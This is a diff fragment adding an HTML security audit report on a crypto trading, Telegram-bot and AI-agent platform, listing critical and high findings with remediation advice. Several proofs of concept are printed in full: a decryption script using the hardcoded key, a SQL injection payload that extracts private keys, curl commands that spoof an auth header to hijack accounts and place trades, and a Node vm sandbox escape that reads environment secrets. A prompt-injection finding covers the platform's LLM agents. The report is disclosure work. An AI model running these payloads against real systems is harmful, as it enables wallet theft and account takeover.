+      <tr><td class="finding-id-cell"><a href="#H09">KSR-B4-H09</a></td><td>withdrawPlatformFees() Always Reverts (No Real ETH)</td><td>Smart Contract</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H10">KSR-B4-H10</a></td><td>Encryption Key Derived from DATABASE_URL</td><td>Backend</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H11">KSR-B4-H11</a></td><td>TOCTOU Race Conditions in Buy Execution</td><td>Trading</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H12">KSR-B4-H12</a></td><td>Unauthorized Profit Fee Extraction Using User Keys</td><td>Trading</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H13">KSR-B4-H13</a></td><td>Aster Client Logs Sensitive Credentials &amp; Auth Data</td><td>Trading</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H14">KSR-B4-H14</a></td><td>Bounty Wallet Private Key Exposure in Logs</td><td>Twitter</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H15">KSR-B4-H15</a></td><td>Complete Centralization &mdash; Single EOA Owns All Contracts</td><td>Smart Contract</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <!-- SENTINEL NEW HIGHS -->
+      <tr><td class="finding-id-cell"><a href="#H16">KSR-B4-H16</a></td><td>CORS Origin Bypass via Wildcard Matching</td><td>Backend</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H17">KSR-B4-H17</a></td><td>Pervasive SQL Injection Surface in storage.ts (30+ Locations)</td><td>Backend</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H18">KSR-B4-H18</a></td><td>Debug Balance Endpoint Leaks Sensitive Data in Production</td><td>Backend</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H19">KSR-B4-H19</a></td><td>CSP Allows unsafe-inline and unsafe-eval in Production</td><td>Backend</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H20">KSR-B4-H20</a></td><td>Simulated ZK Proofs &mdash; Fake Groth16 in zerc20-sdk</td><td>Crypto</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H21">KSR-B4-H21</a></td><td>Unlimited ERC20 Approval (type(uint256).max) Client-Side</td><td>Client</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell"><a href="#H22">KSR-B4-H22</a></td><td>Shared Auth Token Across All Analytics Sessions</td><td>Backend</td><td><span class="badge high">HIGH</span></td><td><span class="status open">Open</span></td></tr>
+      <!-- MEDIUM (sample) -->
+      <tr><td class="finding-id-cell">KSR-B4-M01</td><td>Unauthenticated Workspace Usage Manipulation</td><td>Backend</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M02</td><td>Public LLM Endpoint Abuse (/api/builder/chat)</td><td>Backend</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M03</td><td>AI Bounty Verification Bypass (Generous LLM Scoring)</td><td>Twitter</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M04</td><td>Agent Personality Poisoning via Twitter Interactions</td><td>Twitter</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M05</td><td>SEO Prerender HTML Injection (Stored XSS)</td><td>Frontend</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M06</td><td>No Agent Ownership Validation on Queries</td><td>Telegram</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M07</td><td>Fake Message Injection via bot.emit()</td><td>Telegram</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M08</td><td>In-Memory Rate Limiter Bypass via Restart</td><td>Backend</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M09</td><td>Agent Name/Bio Prompt Injection in Autonomous Actions</td><td>AI/LLM</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+      <tr><td class="finding-id-cell">KSR-B4-M10</td><td>OnchainsOS Command Injection via User Parameters</td><td>Backend</td><td><span class="badge medium">MEDIUM</span></td><td><span class="status open">Open</span></td></tr>
+    </tbody>
+  </table>
+  <p style="color:var(--text-muted); font-size:13px;">Showing top 42 of 127 findings. Full findings available in detailed section below. <span style="color:var(--accent-cyan);">&#9670; SENTINEL-validated</span></p>
+</section>
+
+<!-- DETAILED FINDINGS (Critical Only for length) -->
+<section id="findings-detail" class="container">
+  <div class="section-divider"></div>
+  <h2>Detailed Findings &mdash; Critical</h2>
+  <p>Click any finding header to expand/collapse details.</p>
+
+  <!-- C01 -->
+  <div class="finding sev-critical" id="C01">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C01</div>
+      <h3 class="finding-title">Hardcoded Encryption Key for All User Private Keys</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>10.0</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-798</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/storage.ts:87</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>All user wallet private keys are encrypted using AES-256-GCM, but the encryption key is derived from a <strong>hardcoded default value</strong> in the open-source codebase. If <code>WALLET_ENCRYPTION_KEY</code> is not set in environment variables, the key defaults to <code>"build4-beehave-prod-stable-encryption-key-2026"</code>. The PBKDF2 salt is also hardcoded: <code>"build4-platform-v2"</code>. Since the code is public on GitHub, anyone can derive the encryption key and decrypt all stored private keys.</p></div>
+    <div class="finding-section"><h4>Impact</h4><p>Complete compromise of ALL user wallets. An attacker with database read access (via SQLi or DB breach) can decrypt every private key and drain every wallet.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code>// Reproduce with Node.js
+const crypto = require('crypto');
+const STABLE_KEY = "build4-beehave-prod-stable-encryption-key-2026";
+const SALT = "build4-platform-v2";
+const key = crypto.pbkdf2Sync(STABLE_KEY, SALT, 100000, 32, "sha512");
+
+// Now decrypt any encrypted_private_key from DB:
+function decrypt(ciphertext) {
+  const [ivHex, tagHex, encrypted] = ciphertext.split(":");
+  const iv = Buffer.from(ivHex, "hex");
+  const tag = Buffer.from(tagHex, "hex");
+  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
+  decipher.setAuthTag(tag);
+  return decipher.update(encrypted, "hex", "utf8") + decipher.final("utf8");
+}</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>1. <strong>Immediately</strong> rotate to a unique, high-entropy encryption key stored in a secrets manager (AWS KMS, HashiCorp Vault, or at minimum a non-committed .env file). 2. Re-encrypt all existing private keys with the new key. 3. Remove the hardcoded default entirely &mdash; fail closed if the key is not configured. 4. Consider using HSM-backed key management for production.</p></div>
+  </div>
+
+  <!-- C02 -->
+  <div class="finding sev-critical" id="C02">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C02</div>
+      <h3 class="finding-title">SQL Injection via sql.raw() in Quest Completion</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>9.1</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-89</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/routes.ts:1262-1263</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The <code>/api/quests/complete</code> endpoint uses <code>sql.raw()</code> with string interpolation to build a SQL query. The <code>wallet</code> parameter from the request body is "sanitized" by replacing single quotes, but this is trivially bypassable.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code>// Malicious request:
+POST /api/quests/complete
+{"wallet": "0x0') UNION SELECT encrypted_private_key FROM telegram_wallets--", "questId": "join"}
+
+// The resulting SQL becomes:
+// SELECT chat_id FROM telegram_wallets WHERE LOWER(wallet_address) = LOWER('0x0')
+// UNION SELECT encrypted_private_key FROM telegram_wallets--') LIMIT 1</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Replace <code>sql.raw()</code> with Drizzle ORM's parameterized query builder:</p>
+<pre><code>// BEFORE (vulnerable):
+db.execute(sql.raw(`SELECT ... LOWER('${wallet.replace(/'/g, "''")}') LIMIT 1`))
+
+// AFTER (safe):
+db.select().from(telegramWallets)
+  .where(eq(sql`LOWER(${telegramWallets.walletAddress})`, wallet.toLowerCase()))
+  .limit(1)</code></pre></div>
+  </div>
+
+  <!-- C03 -->
+  <div class="finding sev-critical" id="C03">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C03</div>
+      <h3 class="finding-title">Zero Authentication on MiniApp API (Header Spoofing)</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>9.8</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-287</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/miniapp-routes.ts:78-117</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>All MiniApp API endpoints authenticate users solely via the <code>x-telegram-chat-id</code> HTTP header, which is user-supplied and completely spoofable. There is no Telegram <code>initData</code> HMAC verification, no session token, no JWT &mdash; just a raw, unverified header. Any HTTP client can impersonate any user by setting this header to the victim's Telegram chat ID.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code># View any user's account:
+curl -H "x-telegram-chat-id: 123456789" https://build4.io/api/miniapp/account
+
+# Import attacker's wallet into victim's account:
+curl -X POST https://build4.io/api/miniapp/import-wallet \
+  -H "x-telegram-chat-id: 123456789" \
+  -H "Content-Type: application/json" \
+  -d '{"privateKey": "0xATTACKER_KEY"}'
+
+# Execute trades as victim:
+curl -X POST https://build4.io/api/miniapp/trade \
+  -H "x-telegram-chat-id: 123456789" \
+  -H "Content-Type: application/json" \
+  -d '{"symbol": "BTCUSDT", "side": "BUY", "amount": "1000"}'</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Implement Telegram WebApp <code>initData</code> validation using HMAC-SHA256 verification as per Telegram's official documentation. Validate the <code>hash</code> parameter against the bot token on every request. Add session management with signed JWTs after initial verification.</p></div>
+  </div>
+
+  <!-- C04 -->
+  <div class="finding sev-critical" id="C04">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C04</div>
+      <h3 class="finding-title">Node.js VM Sandbox Escape &rarr; Remote Code Execution</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>9.8</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-94</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/skill-executor.ts:158-210</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The skill execution engine uses Node.js <code>vm</code> module to sandbox user-provided code. The <code>vm</code> module is <strong>explicitly documented by Node.js as NOT a security mechanism</strong>. The regex-based validation (<code>validateSkillCode</code>) checks for forbidden patterns like <code>require(</code>, <code>process.</code>, <code>Function(</code>, etc., but these can be bypassed through prototype chain access, Unicode tricks, or obfuscation.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code>// Classic VM escape via constructor chain:
+const code = `
+  const ForeignObject = this.constructor;
+  const ForeignFunction = ForeignObject.constructor;
+  const proc = ForeignFunction("return this")().process;
+  const env = proc.env;
+  __result__ = {
+    DATABASE_URL: env.DATABASE_URL,
+    WALLET_KEY: env.WALLET_ENCRYPTION_KEY,
+    TELEGRAM_TOKEN: env.TELEGRAM_BOT_TOKEN,
+    ALL_KEYS: Object.keys(env)
+  };
+`;
+// The regex won't catch "this.constructor" (only "constructor[" is blocked)</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Replace <code>vm</code> with a proper sandboxing solution: <code>isolated-vm</code> (V8 isolate-based), <code>vm2</code> (deprecated but better), or ideally a WebAssembly-based sandbox like <code>quickjs-emscripten</code>. Add a strict CSP-like allowlist for the sandbox context. Run skill code in a separate process with minimal privileges.</p></div>
+  </div>
+
+  <!-- C05 -->
+  <div class="finding sev-critical" id="C05">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C05</div>
+      <h3 class="finding-title">Private Keys Sent in Telegram Messages (Plaintext)</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>9.0</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-312</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/telegram-bot.ts:3346, 12245, 7998</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>When users create Solana wallets, sniper wallets, or export keys, private keys are sent as Telegram messages in plaintext markdown. Auto-deletion after 30-60 seconds does not guarantee removal from Telegram infrastructure, notification caches, synced devices, or client-side storage.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Never send private keys via Telegram. Instead, serve a one-time-view HTTPS page that expires after viewing, or require users to use a local CLI to retrieve keys securely.</p></div>
+  </div>
+
+  <!-- C06-C11 abbreviated for file size -->
+  <div class="finding sev-critical" id="C06">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C06</div>
+      <h3 class="finding-title">Private Keys Cached in Global Memory Map (No TTL/Eviction)</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.7</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-316</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/telegram-bot.ts:192 (inMemoryKeyCache)</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>All user private keys are cached indefinitely in a global <code>Map&lt;string, string&gt;</code> with no TTL, no eviction policy, and no encryption. A heap dump, crash dump, or memory access exposes every key.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Implement a time-bounded LRU cache (30s TTL max). Clear keys immediately after each transaction. Consider HSM or encrypted in-memory storage.</p></div>
+  </div>
+
+  <div class="finding sev-critical" id="C07">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C07</div>
+      <h3 class="finding-title">Stealth Buy System Has No Authorization</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>9.0</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-862</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/stealth-buy.ts</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The stealth buy system allows triggering token purchases without any authentication or ownership verification. Any caller can initiate buys using server-held private keys.</p></div>
+  </div>
+
+  <div class="finding sev-critical" id="C08">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C08</div>
+      <h3 class="finding-title">Plaintext Private Key Caching in Trading Agent</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.7</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-312</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/trading-agent.ts</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The trading agent caches decrypted private keys in memory for the duration of trading operations without any encryption or time bounds.</p></div>
+  </div>
+
+  <div class="finding sev-critical" id="C09">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C09</div>
+      <h3 class="finding-title">ERC20 Transfer Return Value Ignored (BUILD4Staking)</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-252</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">contracts/web4/BUILD4Staking.sol:104,136,150,157</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>All <code>transfer()</code> and <code>transferFrom()</code> calls ignore return values. If the $B4 token returns <code>false</code> instead of reverting, phantom deposits or lost withdrawals can occur. Use OpenZeppelin's <code>SafeERC20</code>.</p></div>
+  </div>
+
+  <div class="finding sev-critical" id="C10">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C10</div>
+      <h3 class="finding-title">Unlimited Token Approvals in DeFi Operations</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-269</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/trading-agent.ts, server/token-launcher.ts</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>Token approvals use <code>MaxUint256</code> (unlimited) rather than exact amounts needed. If any approved contract is compromised, all user tokens can be drained.</p></div>
+  </div>
+
+  <div class="finding sev-critical" id="C11">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C11</div>
+      <h3 class="finding-title">Private Key Fallback Returns Plaintext on Format Error</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-209</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/storage.ts:138</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The <code>decryptPrivateKey()</code> function returns the raw ciphertext when the format is invalid: <code>if (parts.length !== 3) return ciphertext;</code>. If a key is stored in plaintext (legacy, migration error), this silently returns the raw private key through any code path that calls the decrypt function.</p></div>
+  </div>
+
+</section>
+
+<!-- HIGH FINDINGS SECTION -->
+<section class="container">
+  <div class="section-divider"></div>
+  <h2>Detailed Findings &mdash; High Severity (Top 15)</h2>
+
+  <div class="finding sev-high" id="H01">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H01</div>
+      <h3 class="finding-title">Prompt Injection Across All AI Agents</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.2</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-77</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">telegram-bot.ts, twitter-agent.ts, agent-runner.ts, routes.ts</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>User-supplied text is injected directly into LLM prompts without sanitization across all AI interfaces: Telegram agent chat, Twitter mention replies, builder chat, and autonomous agent actions. Attackers can extract system prompts, manipulate agent behavior, inject phishing content, or cause the Twitter bot to post scam messages.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Implement prompt injection detection. Use structured message formatting with clear role separation. Wrap user input in delimiter tags. Post-process LLM output to filter wallet addresses and financial instructions.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H02">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H02</div>
+      <h3 class="finding-title">15-25% Slippage Tolerance Enables Sandwich Attacks</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-682</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/trading-agent.ts, server/token-launcher.ts</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>Slippage tolerances of 15-25% on DEX trades enable guaranteed profit for MEV bots via sandwich attacks. Every user trade is extractable &mdash; a front-running bot can sandwich the trade and extract up to 25% of the trade value.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Reduce default slippage to 1-3%. Use private mempools (Flashbots Protect, MEV Blocker). Implement slippage calculation based on pool liquidity.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H03">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H03</div>
+      <h3 class="finding-title">HMAC Signature Truncated to 64 Bits</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.4</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-328</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/telegram-bot.ts:1688</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>HMAC-SHA256 for wallet linking is truncated to 16 hex chars (64 bits): <code>.digest("hex").substring(0, 16)</code>. Additionally, the HMAC secret falls back to the Telegram bot token if <code>SESSION_SECRET</code> is not set.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H04">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H04</div>
+      <h3 class="finding-title">Callback Data Manipulation for Unauthorized Trades</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-20</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/telegram-bot.ts (multiple handlers)</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>Telegram callback data is parsed with simple <code>split(":")</code> without validation. A modified client can send arbitrary callback data to trigger buys on arbitrary tokens at arbitrary amounts.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H05">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H05</div>
+      <h3 class="finding-title">SSRF via Outreach URL Fetching</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.7</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-918</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/outreach.ts:458-598</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The outreach system fetches URLs from database targets. No validation against private IP ranges allows SSRF to cloud metadata endpoints (169.254.169.254), internal services, and network scanning.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H06"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H06</div><h3 class="finding-title">Twitter API Credentials Stored Plaintext in DB</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-312</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">server/multi-twitter-agent.ts:27-33</span></div></div><div class="finding-section"><h4>Description</h4><p>Unlike env-based credentials, the multi-agent system reads Twitter API keys directly from the database without encryption. A DB breach exposes all connected Twitter accounts.</p></div></div>
+
+  <div class="finding sev-high" id="H07"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H07</div><h3 class="finding-title">creditAgent Creates Unbacked Virtual Balances</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-682</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">contracts/web4/AgentEconomyHub.sol:113</span></div></div><div class="finding-section"><h4>Description</h4><p><code>creditAgent()</code> increases virtual balances without real BNB entering the contract. Revenue sharing through the skill marketplace can inflate balances beyond the contract's actual BNB holdings, creating insolvency.</p></div></div>
+
+  <div class="finding sev-high" id="H08"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H08</div><h3 class="finding-title">addRewards() Overwrites Rate, Orphans Tokens</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-682</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">contracts/web4/BUILD4Staking.sol:155-161</span></div></div><div class="finding-section"><h4>Description</h4><p><code>addRewards()</code> directly overwrites <code>rewardRate</code> without distributing remaining rewards from the previous period. Undistributed tokens become permanently locked.</p></div></div>
+
+  <div class="finding sev-high" id="H09"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H09</div><h3 class="finding-title">withdrawPlatformFees() Always Reverts</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-703</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">contracts/web4/SkillMarketplace.sol:123-130</span></div></div><div class="finding-section"><h4>Description</h4><p>The SkillMarketplace tracks <code>accumulatedPlatformFees</code> in accounting but never receives actual BNB (all flows go through the Hub). The <code>call{value: amount}</code> will always revert with zero balance.</p></div></div>
+
+  <div class="finding sev-high" id="H10"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H10</div><h3 class="finding-title">Encryption Key Derived from DATABASE_URL</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-321</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">server/storage.ts:102-112</span></div></div><div class="finding-section"><h4>Description</h4><p>One of the fallback encryption keys is <code>SHA256(DATABASE_URL)</code>. Anyone who sees the DB connection string (CI logs, error messages, infra breach) can derive the key and decrypt all private keys.</p></div></div>
+
+  <div class="finding sev-high" id="H11"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H11</div><h3 class="finding-title">TOCTOU Race Conditions in Buy Execution</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-367</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">server/trading-agent.ts</span></div></div><div class="finding-section"><h4>Description</h4><p>Time-of-check to time-of-use gaps between balance verification and trade execution. Concurrent requests can double-spend or execute trades with insufficient funds.</p></div></div>
+
+  <div class="finding sev-high" id="H12"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H12</div><h3 class="finding-title">Unauthorized Profit Fee Extraction Using User Keys</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-862</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">server/trading-agent.ts</span></div></div><div class="finding-section"><h4>Description</h4><p>The trading agent extracts profit fees using user-held private keys without explicit per-transaction consent. The platform operator can debit user wallets.</p></div></div>
+
